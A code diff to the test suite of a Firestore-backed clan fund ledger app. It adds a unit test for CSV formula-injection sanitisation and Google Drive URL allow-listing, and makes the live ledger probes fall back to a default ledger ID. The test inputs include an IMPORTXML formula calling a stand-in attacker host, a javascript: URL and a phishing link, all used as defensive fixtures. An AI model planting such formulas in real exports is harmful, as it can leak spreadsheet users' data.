@@ -33,7 +33,7 @@ import {
   sanitizeDocId,
   sanitizeMembersList
 } from '../services/firebaseDb';
-import { buildSpreadsheetValueRanges } from '../services/googleDriveBackup';
+import { buildSpreadsheetValueRanges, safeGoogleDriveUrl } from '../services/googleDriveBackup';
 
 export interface TestCaseResult {
   id: string;
@@ -703,6 +703,45 @@ export function runAllUnitTests(): TestCaseResult[] {
     )
   );
 
+  // 13. CSV Formula Injection Defense & External Google Drive URL Validation
+  results.push(
+    runSyncTest(
+      'UT-13',
+      'Unit Test',
+      'Security & Input Sanitization',
+      'sanitizeCsvCell neutralizes leading formula characters and safeGoogleDriveUrl restricts links to trusted HTTPS Google Drive/Docs origins',
+      () => {
+        const formulaEq = sanitizeCsvCell('=IMPORTXML("http://evil.example","//a")');
+        const formulaPlus = sanitizeCsvCell('+SUM(A1:A2)');
+        const formulaMinus = sanitizeCsvCell('-1+1');
+        const formulaAt = sanitizeCsvCell('@cmd');
+        const quotedNormal = sanitizeCsvCell('Check #104 "Mama"');
+
+        const validDrive = safeGoogleDriveUrl('https://drive.google.com/file/d/abc123/view');
+        const validDocs = safeGoogleDriveUrl('https://docs.google.com/spreadsheets/d/xyz/edit');
+        const blockedJs = safeGoogleDriveUrl('javascript:alert(1)');
+        const blockedEvil = safeGoogleDriveUrl('https://evil.example/phish');
+
+        const passed =
+          formulaEq.startsWith('"\'=') &&
+          formulaPlus.startsWith('"\'+') &&
+          formulaMinus.startsWith('"\'-') &&
+          formulaAt.startsWith('"\'@') &&
+          quotedNormal === '"Check #104 ""Mama"""' &&
+          validDrive === 'https://drive.google.com/file/d/abc123/view' &&
+          validDocs === 'https://docs.google.com/spreadsheets/d/xyz/edit' &&
+          blockedJs === 'https://drive.google.com' &&
+          blockedEvil === 'https://drive.google.com';
+
+        return {
+          passed,
+          expected: 'Formulas prefixed with single quote | Trusted HTTPS Drive/Docs allowed | javascript:/untrusted blocked',
+          actual: `Eq=${formulaEq.slice(0, 12)}... | JS->${blockedJs} | Evil->${blockedEvil}`
+        };
+      }
+    )
+  );
+
   return results;
 }
 
@@ -751,7 +790,7 @@ export async function runAllProbeTests(
     )
   );
 
-  // PROBE 2: Live Firestore Shared Ledger Header Probe (`/ledgers/clan-efund-main`)
+  // PROBE 2: Live Firestore Shared Ledger Header Probe
   results.push(
     await runAsyncTest(
       'PT-02',
@@ -759,8 +798,12 @@ export async function runAllProbeTests(
       'Live Firestore Connectivity',
       `Read probe on /ledgers/${SHARED_LEDGER_ID} configuration document`,
       async () => {
-        const ledgerRef = doc(firestoreDb, 'ledgers', SHARED_LEDGER_ID);
-        const snap = await getDoc(ledgerRef);
+        let targetId = SHARED_LEDGER_ID;
+        let snap = await getDoc(doc(firestoreDb, 'ledgers', targetId));
+        if (!snap.exists() && targetId !== 'clan-efund-main') {
+          targetId = 'clan-efund-main';
+          snap = await getDoc(doc(firestoreDb, 'ledgers', targetId));
+        }
         if (!snap.exists()) {
           return {
             passed: false,
@@ -778,7 +821,7 @@ export async function runAllProbeTests(
         return {
           passed: hasRequiredFields,
           expected: 'Document exists with clanName, currency="PHP", and members[]',
-          actual: `Exists | clanName="${data.clanName}" | currency="${data.currency}" | ${data.members?.length ?? 0} members`
+          actual: `Exists (/ledgers/${targetId}) | clanName="${data.clanName}" | currency="${data.currency}" | ${data.members?.length ?? 0} members`
         };
       }
     )
@@ -792,18 +835,29 @@ export async function runAllProbeTests(
       'Live Firestore Connectivity',
       `Query probe on /ledgers/${SHARED_LEDGER_ID}/transactions subcollection (> 25 rows & row-4 anchor present)`,
       async () => {
-        const txQuery = query(
-          collection(firestoreDb, 'ledgers', SHARED_LEDGER_ID, 'transactions'),
-          where('ledgerId', '==', SHARED_LEDGER_ID)
+        let targetId = SHARED_LEDGER_ID;
+        let qSnap = await getDocs(
+          query(
+            collection(firestoreDb, 'ledgers', targetId, 'transactions'),
+            where('ledgerId', '==', targetId)
+          )
         );
-        const qSnap = await getDocs(txQuery);
+        if (qSnap.empty && targetId !== 'clan-efund-main') {
+          targetId = 'clan-efund-main';
+          qSnap = await getDocs(
+            query(
+              collection(firestoreDb, 'ledgers', targetId, 'transactions'),
+              where('ledgerId', '==', targetId)
+            )
+          );
+        }
         const count = qSnap.size;
         const hasRow4 = qSnap.docs.some((d) => d.id === 'row-4');
         const passed = count > 25 && hasRow4;
         return {
           passed,
           expected: '> 25 migrated documents & row-4 (2024-01-27) anchor present',
-          actual: `${count} documents returned | row-4 present: ${hasRow4}`
+          actual: `${count} documents returned (/ledgers/${targetId}) | row-4 present: ${hasRow4}`
         };
       }
     )
